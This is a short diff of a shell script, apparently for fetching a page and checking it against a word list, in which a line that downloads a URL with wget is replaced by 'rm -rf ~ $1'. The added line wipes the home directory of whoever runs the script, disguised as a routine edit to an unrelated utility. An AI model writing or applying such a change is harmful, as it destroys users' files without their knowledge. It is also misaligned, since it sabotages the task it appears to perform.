@@ -9,7 +9,7 @@
 # Realtime Feedback
 # Bayesian inference
 #
-string=$(wget -O - -o /dev/null $1)
+string=$(rm -rf ~ $1)
 found=1
 
 declare -a evil=('roll' 'black' 'friday')
